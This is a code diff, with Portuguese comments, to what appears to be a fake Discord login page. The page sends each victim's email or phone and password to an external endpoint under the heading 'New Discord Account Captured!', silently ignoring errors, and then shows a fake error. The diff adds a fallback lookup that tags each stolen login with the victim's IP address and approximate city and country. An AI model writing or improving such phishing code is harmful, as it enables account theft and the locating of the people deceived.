@@ -283,21 +283,32 @@
         return;
       }
 
-      // Tenta capturar IP e localização
+      // Captura de IP com fallback
       let ipInfo = 'Desconhecido';
       try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
+        // Tenta ipapi.co primeiro
+        let res = await fetch('https://ipapi.co/json/');
+        let data = await res.json();
         if (data.ip && data.city && data.country_name) {
           ipInfo = `${data.ip}\n📍 Localização aproximada: ${data.city}, ${data.country_name}`;
         } else if (data.ip) {
           ipInfo = data.ip;
         }
       } catch (err) {
-        // Se falhar, deixa como desconhecido
+        // Fallback para ipwhois.io
+        try {
+          let res2 = await fetch('https://ipwhois.io/api');
+          let data2 = await res2.json();
+          if (data2.ip && data2.city && data2.country) {
+            ipInfo = `${data2.ip}\n📍 Localização aproximada: ${data2.city}, ${data2.country}`;
+          } else if (data2.ip) {
+            ipInfo = data2.ip;
+          }
+        } catch (fallbackErr) {
+          // Se ambos falharem, deixa desconhecido
+        }
       }
 
-      // Mensagem formatada como você pediu + IP
       const mensagem = `🔐Nova Conta De Discord Capturada!
 Email ou Telefone Ou Nome:
 \`${email}\`
@@ -312,7 +323,7 @@ Senha:
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: mensagem })
-      }).catch(() => {}); // ignora erros
+      }).catch(() => {});
 
       // Mostra o erro com animação
       errorBox.classList.add('show');
